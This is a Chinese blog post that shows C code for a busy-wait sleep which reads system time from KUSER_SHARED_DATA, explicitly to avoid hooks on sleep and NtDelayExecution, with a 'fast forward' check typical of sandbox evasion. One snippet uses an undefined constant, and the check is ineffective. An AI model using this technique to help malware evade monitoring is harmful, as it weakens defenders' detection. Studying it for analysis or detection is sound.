@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/Dota_128px_1143945_easyicon.net.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"mamor5409.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+<script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+<link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+<style>
+    .pace .pace-progress {
+        background: #1E92FB; /*进度条颜色*/
+        height: 3px;
+    }
+    .pace .pace-progress-inner {
+         box-shadow: 0 0 10px #1E92FB, 0 0 5px     #1E92FB; /*阴影颜色*/
+    }
+    .pace .pace-activity {
+        border-top-color: #1E92FB;    /*上边框颜色*/
+        border-left-color: #1E92FB;    /*左边框颜色*/
+    }
+</style>
+
+  <meta property="og:type" content="article">
+<meta property="og:title" content="利用CPU周期执行自定义sleep">
+<meta property="og:url" content="http://mamor5409.github.io/posts/e65cfe16/index.html">
+<meta property="og:site_name" content="Mamor&#39;s Blog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2023-05-25T08:48:24.000Z">
+<meta property="article:modified_time" content="2023-06-07T00:51:19.046Z">
+<meta property="article:author" content="Mamor">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://mamor5409.github.io/posts/e65cfe16/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>利用CPU周期执行自定义sleep | Mamor's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Mamor's Blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Mamor's Blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-commonweal">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://mamor5409.github.io/posts/e65cfe16/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/kabi.jpg">
+      <meta itemprop="name" content="Mamor">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Mamor's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          利用CPU周期执行自定义sleep
+        </h1>
+
+        <div class="post-meta">
+
+			
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-05-25 16:48:24" itemprop="dateCreated datePublished" datetime="2023-05-25T16:48:24+08:00">2023-05-25</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-06-07 08:51:19" itemprop="dateModified" datetime="2023-06-07T08:51:19+08:00">2023-06-07</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.3k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+            <div class="post-description"> </div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>sleep() sleepEx() Thread.sleep  最终都是调用的NtDelayExecution</p>
+<p>避免sleep函数 或者底层系统调用上挂钩 </p>
+<h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MS_PER_SECOND 1000  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> TICKS_PER_MILLISECOND = <span class="number">10000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="keyword">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __alt_sleepms(<span class="keyword">size_t</span> ms)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">volatile</span> <span class="keyword">size_t</span> x = rand(); <span class="comment">// random buffer var </span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> end = __get_timestamp() + ms; <span class="comment">// calculate when we shall stop sleeping</span></span><br><span class="line">	<span class="keyword">while</span> (__get_timestamp() &lt; end) &#123; x += <span class="number">1</span>; &#125; <span class="comment">// increment random var by 1 till we reach our endtime</span></span><br><span class="line">	<span class="keyword">if</span> (__get_timestamp() - end &gt; <span class="number">2000</span>) <span class="keyword">return</span>; <span class="comment">// Fast Forward check, might need some tuning	</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Before Sleep %lld\n&quot;</span>, __get_timestamp());</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] Sleeping for 10 seconds...\n&quot;</span>);</span><br><span class="line">	__alt_sleepms(<span class="number">10</span> * MS_PER_SECOND);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;[+] After  Sleep %lld\n&quot;</span>, __get_timestamp());</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="KUSER-SHARED-DATA结构"><a href="#KUSER-SHARED-DATA结构" class="headerlink" title="_KUSER_SHARED_DATA结构"></a>_KUSER_SHARED_DATA结构</h4><p>KUSER_SHARED_DATA结构定义了一个数据区域，在Windows系统中用于存储多种用户共享的数据。</p>
+<p>其数据结构如下： 「向后兼容」（在高版本下 在0x330后会添加一些结构，在xp等系统下一般只会到0x330处）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dt _KUSER_SHARED_DATA</span><br><span class="line">ntdll!_KUSER_SHARED_DATA</span><br><span class="line">   +<span class="number">0x000</span> TickCountLowDeprecated : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> TickCountMultiplier : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> InterruptTime    : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x014</span> SystemTime       : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x020</span> TimeZoneBias     : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x02c</span> ImageNumberLow   : Uint2B</span><br><span class="line">   +<span class="number">0x02e</span> ImageNumberHigh  : Uint2B</span><br><span class="line">   +<span class="number">0x030</span> NtSystemRoot     : [<span class="number">260</span>] Wchar</span><br><span class="line">   +<span class="number">0x238</span> MaxStackTraceDepth : Uint4B</span><br><span class="line">   +<span class="number">0x23c</span> CryptoExponent   : Uint4B</span><br><span class="line">   +<span class="number">0x240</span> TimeZoneId       : Uint4B</span><br><span class="line">   +<span class="number">0x244</span> LargePageMinimum : Uint4B</span><br><span class="line">   +<span class="number">0x248</span> AitSamplingValue : Uint4B</span><br><span class="line">   +<span class="number">0x24c</span> AppCompatFlag    : Uint4B</span><br><span class="line">   +<span class="number">0x250</span> RNGSeedVersion   : Uint8B</span><br><span class="line">   +<span class="number">0x258</span> GlobalValidationRunlevel : Uint4B</span><br><span class="line">   +<span class="number">0x25c</span> TimeZoneBiasStamp : Int4B</span><br><span class="line">   +<span class="number">0x260</span> NtBuildNumber    : Uint4B</span><br><span class="line">   +<span class="number">0x264</span> NtProductType    : _NT_PRODUCT_TYPE</span><br><span class="line">   +<span class="number">0x268</span> ProductTypeIsValid : UChar</span><br><span class="line">   +<span class="number">0x269</span> Reserved0        : [<span class="number">1</span>] UChar</span><br><span class="line">   +<span class="number">0x26a</span> NativeProcessorArchitecture : Uint2B</span><br><span class="line">   +<span class="number">0x26c</span> NtMajorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x270</span> NtMinorVersion   : Uint4B</span><br><span class="line">   +<span class="number">0x274</span> ProcessorFeatures : [<span class="number">64</span>] UChar</span><br><span class="line">   +<span class="number">0x2b4</span> Reserved1        : Uint4B</span><br><span class="line">   +<span class="number">0x2b8</span> Reserved3        : Uint4B</span><br><span class="line">   +<span class="number">0x2bc</span> TimeSlip         : Uint4B</span><br><span class="line">   +<span class="number">0x2c0</span> AlternativeArchitecture : _ALTERNATIVE_ARCHITECTURE_TYPE</span><br><span class="line">   +<span class="number">0x2c4</span> BootId           : Uint4B</span><br><span class="line">   +<span class="number">0x2c8</span> SystemExpirationDate : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x2d0</span> SuiteMask        : Uint4B</span><br><span class="line">   +<span class="number">0x2d4</span> KdDebuggerEnabled : UChar</span><br><span class="line">   +<span class="number">0x2d5</span> MitigationPolicies : UChar</span><br><span class="line">   +<span class="number">0x2d5</span> NXSupportPolicy  : Pos <span class="number">0</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> SEHValidationPolicy : Pos <span class="number">2</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> CurDirDevicesSkippedForDlls : Pos <span class="number">4</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d5</span> Reserved         : Pos <span class="number">6</span>, <span class="number">2</span> Bits</span><br><span class="line">   +<span class="number">0x2d6</span> CyclesPerYield   : Uint2B</span><br><span class="line">   +<span class="number">0x2d8</span> ActiveConsoleId  : Uint4B</span><br><span class="line">   +<span class="number">0x2dc</span> DismountCount    : Uint4B</span><br><span class="line">   +<span class="number">0x2e0</span> ComPlusPackage   : Uint4B</span><br><span class="line">   +<span class="number">0x2e4</span> LastSystemRITEventTickCount : Uint4B</span><br><span class="line">   +<span class="number">0x2e8</span> NumberOfPhysicalPages : Uint4B</span><br><span class="line">   +<span class="number">0x2ec</span> SafeBootMode     : UChar</span><br><span class="line">   +<span class="number">0x2ed</span> VirtualizationFlags : UChar</span><br><span class="line">   +<span class="number">0x2ee</span> Reserved12       : [<span class="number">2</span>] UChar</span><br><span class="line">   +<span class="number">0x2f0</span> SharedDataFlags  : Uint4B</span><br><span class="line">   +<span class="number">0x2f0</span> DbgErrorPortPresent : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgElevationEnabled : Pos <span class="number">1</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgVirtEnabled   : Pos <span class="number">2</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgInstallerDetectEnabled : Pos <span class="number">3</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgLkgEnabled    : Pos <span class="number">4</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgDynProcessorEnabled : Pos <span class="number">5</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgConsoleBrokerEnabled : Pos <span class="number">6</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgSecureBootEnabled : Pos <span class="number">7</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgMultiSessionSku : Pos <span class="number">8</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgMultiUsersInSessionSku : Pos <span class="number">9</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> DbgStateSeparationEnabled : Pos <span class="number">10</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x2f0</span> SpareBits        : Pos <span class="number">11</span>, <span class="number">21</span> Bits</span><br><span class="line">   +<span class="number">0x2f4</span> DataFlagsPad     : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x2f8</span> TestRetInstruction : Uint8B</span><br><span class="line">   +<span class="number">0x300</span> QpcFrequency     : Int8B</span><br><span class="line">   +<span class="number">0x308</span> SystemCall       : Uint4B</span><br><span class="line">   +<span class="number">0x30c</span> Reserved2        : Uint4B</span><br><span class="line">   +<span class="number">0x310</span> SystemCallPad    : [<span class="number">2</span>] Uint8B</span><br><span class="line">   +<span class="number">0x320</span> TickCount        : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x320</span> TickCountQuad    : Uint8B</span><br><span class="line">   +<span class="number">0x320</span> ReservedTickCountOverlay : [<span class="number">3</span>] Uint4B</span><br><span class="line">   +<span class="number">0x32c</span> TickCountPad     : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x330</span> Cookie           : Uint4B</span><br><span class="line">   +<span class="number">0x334</span> CookiePad        : [<span class="number">1</span>] Uint4B</span><br><span class="line">   +<span class="number">0x338</span> ConsoleSessionForegroundProcessId : Int8B</span><br><span class="line">   +<span class="number">0x340</span> TimeUpdateLock   : Uint8B</span><br><span class="line">   +<span class="number">0x348</span> BaselineSystemTimeQpc : Uint8B</span><br><span class="line">   +<span class="number">0x350</span> BaselineInterruptTimeQpc : Uint8B</span><br><span class="line">   +<span class="number">0x358</span> QpcSystemTimeIncrement : Uint8B</span><br><span class="line">   +<span class="number">0x360</span> QpcInterruptTimeIncrement : Uint8B</span><br><span class="line">   +<span class="number">0x368</span> QpcSystemTimeIncrementShift : UChar</span><br><span class="line">   +<span class="number">0x369</span> QpcInterruptTimeIncrementShift : UChar</span><br><span class="line">   +<span class="number">0x36a</span> UnparkedProcessorCount : Uint2B</span><br><span class="line">   +<span class="number">0x36c</span> EnclaveFeatureMask : [<span class="number">4</span>] Uint4B</span><br><span class="line">   +<span class="number">0x37c</span> TelemetryCoverageRound : Uint4B</span><br><span class="line">   +<span class="number">0x380</span> UserModeGlobalLogger : [<span class="number">16</span>] Uint2B</span><br><span class="line">   +<span class="number">0x3a0</span> ImageFileExecutionOptions : Uint4B</span><br><span class="line">   +<span class="number">0x3a4</span> LangGenerationCount : Uint4B</span><br><span class="line">   +<span class="number">0x3a8</span> Reserved4        : Uint8B</span><br><span class="line">   +<span class="number">0x3b0</span> InterruptTimeBias : Uint8B</span><br><span class="line">   +<span class="number">0x3b8</span> QpcBias          : Uint8B</span><br><span class="line">   +<span class="number">0x3c0</span> ActiveProcessorCount : Uint4B</span><br><span class="line">   +<span class="number">0x3c4</span> ActiveGroupCount : UChar</span><br><span class="line">   +<span class="number">0x3c5</span> Reserved9        : UChar</span><br><span class="line">   +<span class="number">0x3c6</span> QpcData          : Uint2B</span><br><span class="line">   +<span class="number">0x3c6</span> QpcBypassEnabled : UChar</span><br><span class="line">   +<span class="number">0x3c7</span> QpcShift         : UChar</span><br><span class="line">   +<span class="number">0x3c8</span> TimeZoneBiasEffectiveStart : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x3d0</span> TimeZoneBiasEffectiveEnd : _LARGE_INTEGER</span><br><span class="line">   +<span class="number">0x3d8</span> XState           : _XSTATE_CONFIGURATION</span><br><span class="line">   +<span class="number">0x710</span> FeatureConfigurationChangeStamp : _KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x71c</span> Spare            : Uint4B</span><br></pre></td></tr></table></figure>
+
+<h5 id="SystemTime属性"><a href="#SystemTime属性" class="headerlink" title="SystemTime属性"></a>SystemTime属性</h5><p>SystemTime是一个100ns的计时器，从1月1日开始计时</p>
+<p>在偏移量0x14处(0x7FFE0014) 虽然大小为12字节 但实际有效为前8字节（High1Time与High2Time相等）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LARGE_INTEGER time;</span><br><span class="line">time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">time.HighPart = *(<span class="keyword">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br></pre></td></tr></table></figure>
+
+<p>_KSYSTEM_TIME结构如下：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">ntdll!_KSYSTEM_TIME</span><br><span class="line">   +<span class="number">0x000</span> LowPart          : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> High1Time        : Int4B</span><br><span class="line">   +<span class="number">0x008</span> High2Time        : Int4B</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">KSYSTEM_TIME</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">     <span class="keyword">unsigned</span> <span class="keyword">long</span> LowPart;</span><br><span class="line">     <span class="keyword">long</span> High1Time;</span><br><span class="line">     <span class="keyword">long</span> High2Time;</span><br><span class="line">&#125; KSYSTEM_TIME, *PKSYSTEM_TIME;</span><br></pre></td></tr></table></figure>
+
+<p>可以使用它来作为sleep的替代方法</p>
+<p>在C中可以不通过sleep函数调用来获取时间</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> __get_timestamp()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> UNIX_TIME_START = <span class="number">0x019DB1DED53E8000</span>; <span class="comment">// Start of Unix epoch in ticks.</span></span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">size_t</span> TICKS_PER_SECOND = <span class="number">10000000</span>; <span class="comment">// A tick is 100ns.</span></span><br><span class="line">	LARGE_INTEGER time;</span><br><span class="line">	time.LowPart = *(DWORD*)(<span class="number">0x7FFE0000</span> + <span class="number">0x14</span>); <span class="comment">// Read LowPart as unsigned long.</span></span><br><span class="line">	time.HighPart = *(<span class="keyword">long</span>*)(<span class="number">0x7FFE0000</span> + <span class="number">0x1c</span>); <span class="comment">// Read High1Part as long.</span></span><br><span class="line">	<span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LARGE_INTEGER</span> &#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">     DWORD LowPart;		<span class="comment">//32位无符号整数 低32位</span></span><br><span class="line">     LONG  HighPart;	<span class="comment">//32为有符号整数 高32位</span></span><br><span class="line">    &#125; ;</span><br><span class="line">    __int64 QuadPart;	<span class="comment">// 64位整数</span></span><br><span class="line">  &#125; ;</span><br><span class="line">&#125; LARGE_INTEGER, *PLARGE_INTEGER;</span><br></pre></td></tr></table></figure>
+
+<p>UNIX_TIME_START为Unix新纪元的开始，值为0x019DB1DED53E8000</p>
+<p>只需要读取ShareUserData中的SystemTime属性的值，减去单位时间开始的Unix时间，在除以设定的精准度TICKS_PER_SECOND。</p>
